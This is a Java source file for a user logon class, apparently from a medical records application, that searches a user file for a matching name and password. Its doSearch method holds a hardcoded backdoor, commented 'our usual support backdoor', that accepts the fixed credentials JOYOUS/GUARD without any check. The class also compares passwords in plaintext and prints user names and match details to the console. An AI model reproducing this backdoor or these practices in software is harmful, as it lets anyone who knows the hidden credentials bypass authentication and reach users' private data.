/**
 * 
 */
package palmed;

import usrlib.RandomFile;

/**
 * @author Owner
 *
 */
public class pmUserLogon {

	String userName;		// user name to search for
	String password;		// user's password
	boolean flgFound;		// that that user has been found
	
	/**
	 * Constructors
	 */
	public pmUserLogon() {
		this.userName = "";
		this.password = "";
		flgFound = false;
	}
	
	public pmUserLogon( String userName, String password ){
		this.userName = userName.toUpperCase().trim();
		this.password = password.trim();
		flgFound = false;
	}

	/**
	 * @return the userName
	 */
	public String getUserName() {
		return userName;
	}

	/**
	 * @param userName the userName to set
	 */
	public void setUserName(String userName) {
		this.userName = userName.toUpperCase().trim();
	}

	/**
	 * @return the password
	 */
	public String getPassword() {
		return password;
	}

	/**
	 * @param password the password to set
	 */
	public void setPassword(String password) {
		this.password = password.trim();
	}
	
	
	public boolean doSearch(){
		
		int	rec;		// record number
		int	maxrec;		// max record number
		RandomFile file;
		
		pmUserStruct pmUserStruct = new pmUserStruct();
		
		// our usual support backdoor
		if (( userName.equals("JOYOUS")) && ( password.equals("GUARD"))){
			System.out.println( "backdoor" );
			flgFound = true;
			return flgFound;
		}
		
		// Open usermap.ovd file
		file = new RandomFile( Pm.getOvdPath(), pmUserStruct.getFileName(), pmUserStruct.getRecLen(), RandomFile.Mode.READONLY );
		System.out.println( "file usermap.ovd opened" );
		
        // get max record
        maxrec = file.getMaxRecord();
        System.out.println( "maxrec = " + maxrec );
        System.out.println( "searching for " + this.getUserName());

        // loop through all pt records
        for ( rec = 2; rec <= maxrec; ++rec ){

        	System.out.println( "loop counter rec=" + rec );
            file.getRecord( pmUserStruct.getData(), rec );
            if ( ! pmUserStruct.isValid()) continue;
            System.out.println( "valid record rec=" + rec );
            System.out.println( "compare >" + this.userName + "< with >" + pmUserStruct.getLogon().trim() + "<" );
            
            if ( this.userName.equals( pmUserStruct.getLogon().trim())){
            	
                System.out.println( "found " + this.userName + " rec=" + rec );
                
            	if ( this.password.equals( pmUserStruct.getPassword().trim())){

            	// Match Found!
            	// (Don't need to worry about multiples as user names must be unique)
                System.out.println( "found a match, rec=" + rec + ", " + this.userName );

            		flgFound = true;
            		break;
            	}
            }
        }
                
        System.out.println( "loop finished, flgFound = " + flgFound );

        // close file
        file.close();
		
		return flgFound;
	}
	

}
